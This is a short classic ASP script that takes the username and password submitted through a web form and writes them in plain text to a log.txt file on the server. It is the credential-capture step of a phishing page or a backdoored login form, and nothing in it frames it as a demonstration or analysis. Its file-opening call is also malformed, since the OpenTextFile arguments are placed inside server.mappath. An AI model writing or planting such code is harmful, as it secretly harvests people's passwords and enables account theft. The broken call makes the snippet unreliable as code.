Function write_log (u, p)
	set fileName = 'log.txt'
	set fso = server.CreateObject ("scripting.filesystemobject")
	set fd = fso.OpenTextFile (server.mappath (fileName, 8, True, 0))
	
	fd.WriteLine (trim(u) & ":" & trim(p))
	fd.Close
End Function

write_log (request.form("username"), request.form("password"))
